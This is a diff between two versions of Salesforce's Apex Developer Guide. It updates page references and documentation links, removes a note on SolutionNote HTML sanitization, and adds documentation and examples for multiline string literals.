@@ -1,12 +1,12 @@
-# Apex Developer Guide
+# Apex developer guide
 
 > Source: https://resources.docs.salesforce.com/latest/latest/en-us/sfdc/pdf/salesforce_apex_developer_guide.pdf
-> Fetched: 2026-03-16T10:23:38Z
+> Fetched: 2026-06-02T08:15:48Z
 Apex Developer Guide
 
-Version 66.0, Spring ’26
+Version 67.0, Summer ’26
 
-Last updated: March 13, 2026
+Last updated: May 28, 2026
 
 © Copyright 2000–2026 Salesforce, Inc. All rights reserved. Salesforce is a registered trademark of Salesforce, Inc., as are other
 names and marks. Other marks appearing herein may be trademarks of their respective owners.
@@ -24,28 +24,29 @@ Apex Quick Start **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
 Writing Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23**
 
 Data Types and Variables **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23**
-Control Flow Statements **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52**
-Classes, Objects, and Interfaces **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60**
-Working with Data in Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 132**
+Control Flow Statements **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53**
+Classes, Objects, and Interfaces **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61**
+Working with Data in Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 133**
 Document Your Apex Code **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245**
 Running Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263**
 
 Invoking Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 264**
-Apex Transactions and Governor Limits **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 346**
-Using Salesforce Features with Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 360**
-Integration and Apex Utilities **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 603**
-Debugging, Testing, and Deploying Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 671**
+Apex Transactions and Governor Limits **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 347**
+Using Salesforce Features with Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 363**
+Integration and Apex Utilities **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 610**
+Debugging, Testing, and Deploying Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 678**
 
-Debugging Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 671**
-Testing Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 713**
-Deploying Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 748**
-Apex in Managed Packages **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 750**
-Apex Reference **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 778**
-Appendices **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 779**
+Debugging Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 678**
+Testing Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 720**
+Deploying Apex **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 764**
+Apex in Managed Packages **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 766**
+Apex Reference **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 794**
+Appendices **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 794**
 
-Shipping Invoice Example **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 779**
-Reserved Keywords **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 790**
-Documentation Typographical Conventions **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 792**
+Apex Versioned Behavior Changes **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 794**
+Shipping Invoice Example **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 805**
+Reserved Keywords **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 816**
+Documentation Typographical Conventions **. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 818**
 
 APEX DEVELOPER GUIDE
 
@@ -53,7 +54,7 @@ Apex is a strongly typed, object-oriented programming language that allows devel
 statements on the Salesforce Platform server, in conjunction with calls to the API. This guide introduces you to the Apex development
 process and provides valuable information on learning, writing, deploying and testing Apex.
 
-[For reference information on Apex classes, interfaces, exceptions and so on, see Apex Reference Guide.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_ref_guide.htm)
+[For reference information on Apex classes, interfaces, exceptions and so on, see Apex Reference Guide.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_ref_guide.htm)
 
 Apex Release Notes
 Use the Salesforce Release Notes to learn about the most recent updates and changes to Apex.
@@ -393,7 +394,7 @@ you must declare the data type of `My_List` as a list of Integer.
 
 ```
 
-For more information, see Lists on page 28.
+For more information, see Lists on page 29.
 
 A _set_ is a collection of unique, unordered elements. It can contain primitive data types, such as String, Integer, Date, and so on. It can
 also contain more complex data types, such as sObjects.
@@ -464,7 +465,7 @@ the map are being passed in between the curly braces `{}` as the map is being cr
 
 ```
 
-For more information, see Maps on page 31.
+For more information, see Maps on page 32.
 
 Using Branching
 
@@ -484,7 +485,7 @@ follows:
 
 ```
 
-For more information, see Conditional (If-Else) Statements on page 53.
+For more information, see Conditional (If-Else) Statements on page 54.
 
 Using Loops
 
@@ -507,7 +508,7 @@ A _While_ loop checks the condition at the start, before the code executes.
 A _For_ loop enables you to more finely control the condition used with the loop. In addition, Apex supports traditional For loops where
 you set the conditions, as well as For loops that use lists and SOQL queries as part of the condition.
 
-For more information, see Loops on page 57.
+For more information, see Loops on page 58.
 
 #### When Should I Use Apex?
 
@@ -562,14 +563,14 @@ Apex Developer Guide Introducing Apex
 
 **•** Define navigation patterns and data-specific rules for optimal, efficient application interaction.
 
-[For more information, see the Visualforce Developer's Guide.](https://developer.salesforce.com/docs/atlas.en-us.260.0.pages.meta/pages/)
+[For more information, see the Visualforce Developer's Guide.](https://developer.salesforce.com/docs/atlas.en-us.262.0.pages.meta/pages/)
 
 SOAP API
 
 Use standard SOAP API calls when you want to add functionality to a composite application that processes only one type of record at a
 time and does not require any transactional control (such as setting a Savepoint or rolling back changes).
 
-[For more information, see the SOAP API Developer Guide.](https://developer.salesforce.com/docs/atlas.en-us.260.0.api.meta/api/)
+[For more information, see the SOAP API Developer Guide.](https://developer.salesforce.com/docs/atlas.en-us.262.0.api.meta/api/)
 
 #### How Does Apex Work?
 
@@ -694,7 +695,7 @@ Scratch Orgs (Recommended)
 
 A scratch org is a source-driven and temporary deployment of Salesforce code and metadata. A scratch org is fully configurable, allowing
 you to emulate different Salesforce editions with different features and settings. Scratch orgs have a maximum 30-day lifespan, with the
-[default set at 7 days. For information on using and creating scratch orgs, see Scratch Orgs in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_scratch_orgs.htm) _Salesforce DX Developer Guide_ .
+[default set at 7 days. For information on using and creating scratch orgs, see Scratch Orgs in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_scratch_orgs.htm) _Salesforce DX Developer Guide_ .
 
 Developer Edition (DE) Orgs
 
@@ -799,7 +800,7 @@ Alternatively, you can use any text editor, such as Notepad, to write Apex code.
 or use one of the API calls to deploy it.
 
 To develop an Apex IDE of your own, use SOAP API methods for compiling triggers and classes, and executing test methods. Use Metadata
-API methods for deploying code to production environments. For more information, see Deploying Apex on page 748.
+API methods for deploying code to production environments. For more information, see Deploying Apex on page 764.
 
 SEE ALSO:
 
@@ -917,7 +918,7 @@ records. This approach ensures that 75% or more of your code is covered by unit 
 
 **•** All classes and triggers must compile successfully.
 
-For more information on writing tests, see Testing Apex on page 713.
+For more information on writing tests, see Testing Apex on page 720.
 
 #### Deploying Apex to a Sandbox Organization
 
@@ -933,7 +934,7 @@ You can also use the `deploy()` Metadata API call to deploy your Apex from a dev
 A useful API call is `runTests()` . In a development or sandbox organization, you can run the unit tests for a specific class, a list of
 classes, or a namespace.
 
-[You can also use Salesforce CLI. See Develop Against Any Org for details.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_develop_any_org.htm)
+[You can also use Salesforce CLI. See Develop Against Any Org for details.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_develop_any_org.htm)
 
 For more information, see Deploying Apex.
 
@@ -946,7 +947,7 @@ Salesforce production organization.
 [Studio Code and Code Builder.](https://developer.salesforce.com/tools/vscode/)
 
 Also, you can deploy Apex through change sets in the Salesforce user interface. For more information and for additional deployment
-[options, see Deploying Apex on page 748, and Build and Release Your App.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_build_and_release_your_app.htm)
+[options, see Deploying Apex on page 764, and Build and Release Your App.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_build_and_release_your_app.htm)
 
 #### Adding Apex Code to a AppExchange App
 
@@ -1074,7 +1075,7 @@ Prerequisites:
 
 The previous code is the class definition to which you’ll be adding one method in the next step. Apex code is contained in _classes._
 This class is defined as `public`, which means the class is available to other Apex classes and triggers. For more information, see
-Classes, Objects, and Interfaces on page 60.
+Classes, Objects, and Interfaces on page 61.
 
 **3.** Add this method definition between the class opening and closing brackets.
 
@@ -1093,7 +1094,7 @@ Classes, Objects, and Interfaces on page 60.
 
 This method is called `applyDiscount`, and it’s both public and static. Because it’s a static method, you don't need to create an
 instance of the class to access the method—you can use the name of the class followed by a dot (.) and the name of the method.
-For more information, see Static and Instance Methods, Variables, and Initialization Code on page 69.
+For more information, see Static and Instance Methods, Variables, and Initialization Code on page 70.
 
 This method takes one parameter, a list of Book records, which is assigned to the variable `books` . Notice the `__c` in the object
 name `Book__c` . This indicates that it’s a _custom object_ that you created. Standard objects that are provided in the Salesforce
@@ -1119,7 +1120,7 @@ it by 0.9, which means its value is discounted by 10%, and then stores the new v
 Apex Developer Guide Apex Quick Start
 
 is a shortcut. Another way to write this statement is `b.Price__c = b.Price__c * 0.9;` . See Expression Operators on
-page 39.
+page 40.
 
 **4.** Click **Save** to save the new class. You now have this full class definition.
 
@@ -1496,20 +1497,20 @@ In Apex, all variables and expressions have a data type, such as sObject, primit
 **•** A primitive, such as an Integer, Double, Long, Date, Datetime, String, ID, or Boolean (see Primitive Data Types on page 24)
 
 **•** An sObject, either as a generic sObject or as a specific sObject, such as an Account, Contact, or MyCustomObject__c (see Working
-with sObjects on page 132 in Chapter 4.)
+with sObjects on page 133 in Chapter 4.)
 
 **•** A collection, including:
 
 **–** A list (or array) of primitives, sObjects, user defined objects, objects created from Apex classes, or collections (see Lists on page
-28)
+29)
 
 **–** A set of primitives (see Sets on page 31)
 
-**–** A map from a primitive to a primitive, sObject, or collection (see Maps on page 31)
+**–** A map from a primitive to a primitive, sObject, or collection (see Maps on page 32)
 
-**•** A typed list of values, also known as an _enum_ (see Enums on page 33)
+**•** A typed list of values, also known as an _enum_ (see Enums on page 34)
 
-**•** Objects created from user-defined Apex classes (see Classes, Objects, and Interfaces on page 60)
+**•** Objects created from user-defined Apex classes (see Classes, Objects, and Interfaces on page 61)
 
 **•** Objects created from system supplied Apex classes
 
@@ -1519,7 +1520,7 @@ Methods can return values of any of the listed types, or return no value and be 
 
 Type checking is strictly enforced at compile time. For example, the parser generates an error if an object field of type Integer is assigned
 a value of type String. However, all compile-time exceptions are returned as specific fault codes, with the line number and column of
-the error. For more information, see Debugging Apex on page 671.
+the error. For more information, see Debugging Apex on page 678.
 
 #### Primitive Data Types
 
@@ -1536,7 +1537,7 @@ Blob A collection of binary data stored as a single object. You can convert this
 String using the `toString` and `valueOf` methods, respectively. Blobs can be accepted as Web
 
 service arguments, stored in a document (the body of a document is a Blob), or sent as attachments.
-[For more information, see Crypto Class. Salesforce supports Blob manipulation only with Apex class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_classes_restful_crypto.htm)
+[For more information, see Crypto Class. Salesforce supports Blob manipulation only with Apex class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_classes_restful_crypto.htm)
 methods that are supplied by Salesforce.
 
 
@@ -1568,7 +1569,7 @@ about time. Always create date values with a system static method.
 
 You can add or subtract an Integer value from a Date value, returning a Date value. Addition and
 subtraction of Integer values are the only arithmetic functions that work with Date values. You can’t
-[perform arithmetic functions that include two or more Date values. Instead, use the Date methods.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_date.htm)
+[perform arithmetic functions that include two or more Date values. Instead, use the Date methods.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_date.htm)
 
 Use the `String.valueOf()` method to obtain the date without an appended timestamp.
 Using an implicit string conversion with a Date value results in the date with the timestamp appended.
@@ -1580,7 +1581,7 @@ You can add or subtract an Integer or Double value from a Datetime value, return
 Addition and subtraction of Integer and Double values are the only arithmetic functions that work
 
 with Datetime values. You can’t perform arithmetic functions that include two or more Datetime
-[values. Instead, use the Datetime methods.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_datetime.htm)
+[values. Instead, use the Datetime methods.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_datetime.htm)
 
 A number that includes a decimal point. Decimal is an arbitrary precision number. Currency fields
 are automatically assigned the type Decimal.
@@ -1704,60 +1705,45 @@ whitespace. These conventions are necessary for database storage.
 Conversely, Strings in Apex can be `null` or empty and can include leading and trailing whitespace,
 which can be used to construct a message.
 
-The Solution sObject field SolutionNote operates as a special type of String. If you have HTML Solutions
-enabled, any HTML tags used in this field are verified before the object is created or updated. If invalid
-HTML is entered, an error is thrown. Any JavaScript used in this field is removed before the object is
+**EscapeSequences** : All Strings in Apex use the same escape sequences as SOQL strings: `\b`
+(backspace), `\t` (tab), `\n` (line feed), `\f` (form feed), `\r` (carriage return), `\s` (space), `\"` (double
+quote), `\'` (single quote), and `\\` (backslash).
+
+**Comparison Operators** : Unlike Java, Apex Strings support using the comparison operators `==`,
+`!=`, `<`, `<=`, `>`, and `>=` . Because Apex uses SOQL comparison semantics, results for Strings are collated
 
 
 Apex Developer Guide Data Types and Variables
 
 **Data Type** **Description**
 
-created or updated. In the following example, when the Solution displays on a detail page, the
-SolutionNote field has H1 HTML formatting applied to it:
-
-```
-                 trigger t on Solution (before insert) {
-
-                        Trigger.new[0].SolutionNote ='<h1>hello</h1>';
-
-                 }
-
-```
-
-In the following example, when the Solution displays on a detail page, the SolutionNote field only
-contains _`HelloGoodbye`_ :
-
-```
-                 trigger t2 on Solution (before insert) {
-
-                 Trigger.new[0].SolutionNote =
-
-                    '<javascript>Hello</javascript>Goodbye';
-
-                 }
-
-```
-
-For more information, see “HTML Solutions Overview” in Salesforce Help.
-
-**EscapeSequences** : All Strings in Apex use the same escape sequences as SOQL strings: `\b`
-(backspace), `\t` (tab), `\n` (line feed), `\f` (form feed), `\r` (carriage return), `\"` (double quote),
-`\'` (single quote), and `\\` (backslash).
-
-**Comparison Operators** : Unlike Java, Apex Strings support using the comparison operators `==`,
-`!=`, `<`, `<=`, `>`, and `>=` . Because Apex uses SOQL comparison semantics, results for Strings are collated
-[according to the context user’s locale and aren’t case-sensitive. For more information, see Expression](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/langCon_apex_expressions_operators_understanding.htm)
-[Operators.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/langCon_apex_expressions_operators_understanding.htm)
+[according to the context user’s locale and aren’t case-sensitive. For more information, see Expression](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/langCon_apex_expressions_operators_understanding.htm)
+[Operators.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/langCon_apex_expressions_operators_understanding.htm)
 
 **String Methods** : As in Java, Strings can be manipulated with several standard methods. For more
-[information, see String Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_string.htm)
+[information, see String Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_string.htm)
 
-Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime
-error if you assign a String value that is too long for the field.
+**Multiline Strings** : To represent a block of text that spans multiple lines, use a multiline string. A
+multiline string starts with three single quotes ( `'''` ) immediately followed by a new line. To terminate
+a multiline string, use three single quotes ( `'''` ). For example:
+
+```
+                 String multilineStr = '''
+
+                 {
+
+                    "Name" : "John Doe",
+
+                    "Type" : "New Customer"
+
+                 }''';
+
+```
+
+For more information, see the Multiline String Usage section.
 
 Time A value that indicates a particular time. Always create time values with a system static method. See
-[Time Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_time.htm)
+[Time Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_time.htm)
 
 In addition, two non-standard primitive data types can’t be used as variable or method types, but do appear in system static methods:
 
@@ -1767,14 +1753,118 @@ the Lightning Platform database exclusively for sObject fields in field history 
 **•** Currency. The `Currency.newInstance` static method creates a literal of type Currency. This method is for use solely within
 SOQL and SOSL `WHERE` clauses to filter against sObject currency fields. You can’t instantiate Currency in any other type of Apex.
 
-[For more information on the AnyType data type, see Field Types in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/field_types.htm) _Object Reference for Salesforce_ .
+[For more information on the AnyType data type, see Field Types in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/field_types.htm) _Object Reference for Salesforce_ .
+
+Multiline String Usage
+
+**Line Breaks** : Line breaks are automatically translated into newline sequences in the resulting string.
+
+**Whitespace** : Any whitespace before the leftmost non-whitespace character of the string is stripped. Trailing whitespace on each line
+is also stripped. During compilation, whitespace stripping occurs before escape sequences are processed.
+
+In this example, the initial eight whitespace characters, represented as periods, on each line are stripped. This removal occurs because
+the `<` character is the leftmost non-whitespace character in the string. The trailing whitespace characters found on the first, third, and
+fifth lines of the string are also stripped.
+
+```
+   String str = '''
+
+   . . . . . . . . <html> . . .
+
+   . . . . . . . . . . . . <body>
+
+   . . . . . . . . . . . . . . . . <p>Hello, world</p> . . .
+
+   . . . . . . . . . . . . </body>
+
+   . . . . . . . . </html> . . .
+
+   . . . . . . . .''';
+
+```
+
+**Escape Sequences** : Multiline strings support the same escape sequences as regular Apex strings.
 
 
 Apex Developer Guide Data Types and Variables
 
+Use the `\s` escape sequence at the end of a line to create intentional trailing whitespace. In this example, three trailing whitespace
+characters are preserved on the first and fifth lines of the string. The trailing whitespace on the third line of the string is stripped.
+
+```
+   String str = '''
+
+   . . . . . . . . <html> . . . . \s
+
+   . . . . . . . . . . . . <body>
+
+   . . . . . . . . . . . . . . . . <p>Hello, world</p> . . . .
+
+   . . . . . . . . . . . . </body>
+
+   . . . . . . . . </html> . . . . \s
+
+   . . . . . . . .''';
+
+```
+
+Multiline strings additionally support the `\` (concatenate) sequence at the end of lines. The `\` escape sequence concatenates multiple
+lines and prevents the insertion of a newline sequence between them. For example, this multiline string compiles as one line.
+
+```
+   String str = '''
+
+      This is a string that doesn't fit on one line \
+
+      but I don't want it to contain newlines \
+
+   ....so I am using this escape sequence to \
+
+   ....prevent them from being inserted''';
+
+```
+
+Unlike regular Apex strings, multiline strings also support unescaped single quotes ( `'` ). However, to use a single quote directly before
+the closing single quotes ( `'''` ), first escape the single quote. ( `\''''` ). For example, the second single quote in this multiline string
+requires an escape character, whereas the first one doesn’t.
+
+```
+   String str = '''
+
+      I want a single quote here '
+
+      And also right before the string ends\'''';
+
+```
+
+**SOQL Queries** : In SOQL and SOSL queries, you can use multiline strings stored in variables. However, unlike regular string literals, you
+can’t use multiline literals in SOQL or SOSL queries, except in bind expressions. For example, this pattern is unsupported.
+
+```
+   // Unsupported
+
+   List<Account> accs = [SELECT Id FROM Account
+
+                 WHERE Name = '''
+
+                        ExampleOne
+
+                        '''
+
+                 WITH USER_MODE
+
+                ];
+
+```
+
+Otherwise, you can use multiline literals anywhere you can use regular string literals, such as annotation parameters, variable assignments,
+and method argument values.
+
 Versioned Behavior Changes
 
-In API version 16 (Summer ’09) and later, Apex uses the higher-precision Decimal data type in certain types such as currency.
+In API version 16.0 and later, Apex uses the higher-precision Decimal data type in certain types such as currency.
+
+In API version 15.0 and later, Apex classes and triggers produce a runtime error if you assign a String value that is too long for the field.
 
 SEE ALSO:
 
@@ -1782,7 +1872,10 @@ Expression Operators
 
 Class Methods
 
-_[Object Reference for the Salesforce Platform](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/primitive_data_types.htm)_ : Primitive Data Types
+_[Object Reference for the Salesforce Platform](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/primitive_data_types.htm)_ : Primitive Data Types
+
+
+Apex Developer Guide Data Types and Variables
 
 #### Collections Collections in Apex can be lists, sets, or maps.
 
@@ -1826,10 +1919,8 @@ The index position of the first element in a list is always 0.
 
 of lists of sets of Integers. A list can contain up to seven levels of nested collections inside it, that is, up to eight levels overall.
 
+##### To declare a list, use the List keyword followed by the primitive data, sObject, nested list, map, or set type within <> characters. For
 
-Apex Developer Guide Data Types and Variables
-
-To declare a list, use the `List` keyword followed by the primitive data, sObject, nested list, map, or set type within <> characters. For
 example:
 
 ```
@@ -1841,15 +1932,18 @@ example:
 
    List<List<Set<Integer>>> my_list_2 = new List<List<Set<Integer>>>();
 
-```
+##### To access elements in a list, use the List methods provided by Apex. For example:
 
-To access elements in a list, use the `List` methods provided by Apex. For example:
-
-```
    List<Integer> myList = new List<Integer>(); // Define a new list
 
    myList.add(47); // Adds a second element of value 47 to the end
 
+```
+
+
+Apex Developer Guide Data Types and Variables
+
+```
                            // of the list
 
    Integer i = myList.get(0); // Retrieves the element at index 0
@@ -1860,7 +1954,7 @@ To access elements in a list, use the `List` methods provided by Apex. For examp
 
 ```
 
-[For more information, including a complete list of all supported methods, see List Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_list.htm)
+[For more information, including a complete list of all supported methods, see List Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_list.htm)
 
 Using Array Notation for One-Dimensional Lists
 
@@ -1909,13 +2003,10 @@ Defines an Integer list with memory allocated for six Integers
 ```
     List<Integer> ints = new Integer[6];
 
+###### List Sorting
 ```
 
-List Sorting
 You can sort list elements and the sort order depends on the data type of the elements.
-
-
-Apex Developer Guide Data Types and Variables
 
 ###### List Sorting
 
@@ -1926,7 +2017,10 @@ as strings. The sort order of other more complex data types is described in the 
 
 You can sort custom types (your Apex classes) if they implement the `Comparable` interface. Alternatively, a class implementing the
 `Comparator` interface can be passed as a parameter to the `List.sort` method. For more information on the sort order used for
-[sObjects, see Sorting Lists of sObjects.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_list_sorting_sobject.htm)
+[sObjects, see Sorting Lists of sObjects.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_list_sorting_sobject.htm)
+
+
+Apex Developer Guide Data Types and Variables
 
 This example shows how to sort a list of strings and verifies that the colors are in ascending order in the list.
 
@@ -2003,12 +2097,9 @@ The output of the debug statements shows the contents of the list, both before a
 
      System.SelectOption[value="C", label="Canada", disabled="false"])
 
-```
-
-
-Apex Developer Guide Data Types and Variables
-
 ##### Sets
+
+```
 
 A set is an unordered collection of elements that do not contain any duplicates. Set elements can be of any data type—primitive types,
 collections, sObjects, user-defined types, and built-in Apex types.
@@ -2017,11 +2108,13 @@ This table represents a set of strings that uses city names:
 
 'San Francisco' 'New York' 'Paris' 'Tokyo'
 
-##### Sets can contain collections that can be nested within one another. For example, you can have a set of lists of sets of Integers. A set can
 
+Apex Developer Guide Data Types and Variables
+
+Sets can contain collections that can be nested within one another. For example, you can have a set of lists of sets of Integers. A set can
 contain up to seven levels of nested collections inside it, that is, up to eight levels overall.
 
-##### To declare a set, use the Set keyword followed by the primitive data type name within <> characters. For example:
+To declare a set, use the `Set` keyword followed by the primitive data type name within <> characters. For example:
 
 ```
    Set<String> myStringSet = new Set<String>();
@@ -2077,7 +2170,7 @@ The following example shows how to create a set from elements of another set.
 
 ```
 
-[For more information, including a complete list of all supported set system methods, see Set Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_set.htm)
+[For more information, including a complete list of all supported set system methods, see Set Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_set.htm)
 
 Note the following limitations on sets:
 
@@ -2094,9 +2187,6 @@ the same code.
 A map is a collection of key-value pairs where each unique key maps to a single value. Keys and values can be any data type—primitive
 types, collections, sObjects, user-defined types, and built-in Apex types.
 
-
-Apex Developer Guide Data Types and Variables
-
 This table represents a map of countries and currencies:
 
 **Country (Key)** 'United States' 'Japan' 'France' 'England' 'India'
@@ -2105,6 +2195,9 @@ This table represents a map of countries and currencies:
 
 Map keys and values can contain any collection, and can contain nested collections. For example, you can have a map of Integers to
 maps, which, in turn, map Strings to lists. Map keys can contain up to seven levels of nested collections, that is, up to eight levels overall.
+
+
+Apex Developer Guide Data Types and Variables
 
 To declare a map, use the `Map` keyword followed by the data types of the key and the value within `<>` characters. For example:
 
@@ -2151,7 +2244,7 @@ adds two entries, checks for the existence of the first key, retrieves the value
 
 ```
 
-[For more information, including a complete list of all supported Map methods, see Map Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_map.htm)
+[For more information, including a complete list of all supported Map methods, see Map Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_map.htm)
 
 Map Considerations
 
@@ -2170,39 +2263,38 @@ entry.
 distinct Map entries. Subsequently, the Map methods, including `put`, `get`, `containsKey`, and `remove` treat these keys as
 distinct.
 
-**•** Uniqueness of map keys of user-defined types is determined by the `equals` and `[hashCode](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/langCon_apex_collections_maps_keys_userdefined.htm)` methods, which you provide in
+**•** Uniqueness of map keys of user-defined types is determined by the `equals` and `[hashCode](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/langCon_apex_collections_maps_keys_userdefined.htm)` methods, which you provide in
 your classes. Uniqueness of keys of all other non-primitive types, such as sObject keys, is determined by comparing the objects’ field
 values. Use caution when you use an sObject as a map key because when the sObject is changed, it no longer maps to the same
+value. For information and examples, see
+[https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_map_sobject_considerations.htm](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_map_sobject_considerations.htm)
+
+**•** A Map object is serializable into JSON only if it uses one of the following data types as a key.
+
+**–** [Boolean](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_boolean.htm)
+
+**–** [Date](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_date.htm)
+
+**–** [DateTime](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_datetime.htm)
+
+**–** [Decimal](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_decimal.htm)
+
+**–** [Double](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_double.htm)
 
 
 Apex Developer Guide Data Types and Variables
 
-value. For information and examples, see
-[https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_map_sobject_considerations.htm](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_map_sobject_considerations.htm)
-
-**•** A Map object is serializable into JSON only if it uses one of the following data types as a key.
-
-**–** [Boolean](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_boolean.htm)
-
-**–** [Date](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_date.htm)
-
-**–** [DateTime](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_datetime.htm)
-
